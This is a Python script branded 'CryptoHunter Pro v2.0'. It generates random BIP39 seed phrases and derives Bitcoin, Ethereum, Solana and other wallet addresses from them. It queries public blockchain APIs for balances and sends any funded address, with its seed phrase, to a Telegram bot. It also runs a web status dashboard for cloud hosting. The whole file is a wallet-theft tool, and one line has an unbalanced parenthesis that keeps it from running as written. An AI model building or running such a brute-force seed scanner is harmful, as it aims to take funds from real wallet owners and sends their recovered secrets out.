import asyncio
import aiohttp
import time
import json
import os
from mnemonic import Mnemonic
from bip_utils import (
    Bip39MnemonicGenerator, Bip39SeedGenerator, Bip39WordsNum,
    Bip44, Bip44Coins, Bip44Changes
)
from aiohttp import web

# --- CONFIGURATION (Environment Variables preferred for Cloud) ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

try:
    BATCH_SIZE = int(os.environ.get("BATCH_SIZE")
except (ValueError, TypeError):
    BATCH_SIZE = 20

# GLOBAL STATS for Web Dashboard
stats = {
    "checked_count": 0,
    "last_mnemonic": "None",
    "start_time": time.time(),
    "status": "Starting..."
}

# --- COIN MAPPING ---
COINS = {
    "BTC": Bip44Coins.BITCOIN,
    "LTC": Bip44Coins.LITECOIN,
    "DOGE": Bip44Coins.DOGECOIN,
    "BCH": Bip44Coins.BITCOIN_CASH,
    "DASH": Bip44Coins.DASH,
    "ETH": Bip44Coins.ETHEREUM,
    "BNB": Bip44Coins.BINANCE_SMART_CHAIN,
    "MATIC": Bip44Coins.POLYGON,
    "AVAX": Bip44Coins.AVALANCHE,
    "SOL": Bip44Coins.SOLANA
}

async def handle_index(request):
    elapsed = time.time() - stats["start_time"]
    speed = stats["checked_count"] / max(1, elapsed)
    html = f"""
    <html>
        <head><title>CryptoHunter Pro Status</title></head>
        <body style='font-family: sans-serif; background: #121212; color: #fff; text-align: center; padding-top: 50px;'>
            <h1 style='color: #00ff7f;'>CryptoHunter Pro v2.0</h1>
            <div style='background: #1e1e1e; display: inline-block; padding: 20px; border-radius: 10px; border: 1px solid #333;'>
                <p>Status: <span style='color: #00ff7f;'>{stats["status"]}</span></p>
                <p>Total Checked: <b>{stats["checked_count"]}</b></p>
                <p>Speed: <b>{speed:.2f} seeds/sec</b></p>
                <p>Last Mnemonic: <br><code style='color: #00bfff;'>{stats["last_mnemonic"]}</code></p>
                <p>Uptime: {int(elapsed/60)} minutes</p>
            </div>
            <p style='color: #888; margin-top: 20px;'>Render Free Tier Health-Check Active</p>
        </body>
    </html>
    """
    return web.Response(text=html, content_type='text/html')

async def send_telegram(message):
    if not TELEGRAM_BOT_TOKEN or str(TELEGRAM_BOT_TOKEN) in ["None", "YOUR_BOT_TOKEN"]:
        print(f"[!] TELEGRAM NOT SET. Result: {message}")
        return
    
    if not TELEGRAM_CHAT_ID or str(TELEGRAM_CHAT_ID) in ["None", "YOUR_CHAT_ID"]:
        print(f"[!] CHAT ID NOT SET. Result: {message}")
        return
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload) as resp:
                if resp.status != 200:
                    print(f"[!] Telegram Error {resp.status}: {await resp.text()}")
        except Exception as e:
            print(f"[!] Telegram failure: {e}")

async def check_balance_btc(session, addresses):
    addr_str = "|".join(addresses)
    url = f"https://blockchain.info/multiaddr?active={addr_str}"
    try:
        async with session.get(url) as resp:
            data = await resp.json()
            for addr_obj in data.get("addresses", []):
                if addr_obj.get("final_balance", 0) > 0:
                    return addr_obj["address"]
    except:
        pass
    return None

async def check_balance_blockcypher(session, coin_slug, addresses):
    addr_str = ";".join(addresses[:20])
    url = f"https://api.blockcypher.com/v1/{coin_slug}/main/addrs/{addr_str}?balance_only=true"
    try:
        async with session.get(url) as resp:
            data = await resp.json()
            if isinstance(data, list):
                for item in data:
                    if item.get("balance", 0) > 0:
                        return item["address"]
    except:
        pass
    return None

async def check_balance_rpc(session, rpc_url, address):
    payload = {
        "jsonrpc": "2.0",
        "method": "eth_getBalance",
        "params": [address, "latest"],
        "id": 1
    }
    try:
        async with session.post(rpc_url, json=payload) as resp:
            data = await resp.json()
            result = data.get("result")
            if result and result != "0x0":
                return True
    except:
        pass
    return False

async def hunter_loop():
    stats["status"] = "Hunting..."
    async with aiohttp.ClientSession() as session:
        while True:
            batch_seeds = []
            for _ in range(BATCH_SIZE):
                mnemonic = Bip39MnemonicGenerator().FromWordsNum(Bip39WordsNum.WORDS_NUM_12)
                seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
                
                addrs = {"mnemonic": str(mnemonic)}
                for name, coin in COINS.items():
                    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, coin)
                    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
                    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
                    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
                    addrs[name] = bip44_addr_ctx.PublicKey().ToAddress()
                
                batch_seeds.append(addrs)

            tasks = []
            task_info = []
            
            btc_addrs = [s["BTC"] for s in batch_seeds]
            tasks.append(check_balance_btc(session, btc_addrs))
            task_info.append(("BTC_BATCH", None))
            
            for coin_name, slug in [("LTC", "ltc"), ("DOGE", "doge"), ("BCH", "bch"), ("DASH", "dash")]:
                addrs = [s[coin_name] for s in batch_seeds]
                tasks.append(check_balance_blockcypher(session, slug, addrs))
                task_info.append(("LEGACY_BATCH", (coin_name, addrs)))

            rpc_configs = [
                ("ETH", "https://rpc.ankr.com/eth"),
                ("BNB", "https://bsc-dataseed.binance.org"),
                ("MATIC", "https://polygon-rpc.com"),
                ("AVAX", "https://api.avax.network/ext/bc/C/rpc")
            ]
            
            for coin_name, rpc_url in rpc_configs:
                for s in batch_seeds:
                    tasks.append(check_balance_rpc(session, rpc_url, s[coin_name]))
                    task_info.append(("SINGLE", (coin_name, s[coin_name], s["mnemonic"])))

            results = await asyncio.gather(*tasks)
            
            for i, res in enumerate(results):
                if not res: continue
                type, info = task_info[i]
                msg = ""
                if type == "BTC_BATCH":
                    m = next((s["mnemonic"] for s in batch_seeds if s["BTC"] == res), "Unknown")
                    msg = f"🟢 SUCCESS: BTC Found!\nAddress: {res}\nSeed: {m}"
                elif type == "LEGACY_BATCH":
                    coin, addrs = info
                    m = next((s["mnemonic"] for s in batch_seeds if s[coin] == res), "Unknown")
                    msg = f"🟢 SUCCESS: {coin} Found!\nAddress: {res}\nSeed: {m}"
                elif type == "SINGLE":
                    coin, addr, mnem = info
                    msg = f"🟢 SUCCESS: {coin} Found!\nAddress: {addr}\nSeed: {mnem}"
                if msg:
                    print(f"\n[!!!] {msg}")
                    await send_telegram(msg)

            stats["checked_count"] += BATCH_SIZE
            stats["last_mnemonic"] = batch_seeds[-1]["mnemonic"]
            print(f"[*] Checked: {stats['checked_count']} | Speed: {stats['checked_count'] / (time.time() - stats['start_time']):.2f} seeds/sec", end="\r")
            await asyncio.sleep(1)

async def main():
    app = web.Application()
    app.router.add_get('/', handle_index)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("[*] Web Dashboard active on port 10000 (Render Health-Check)")
    await hunter_loop()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
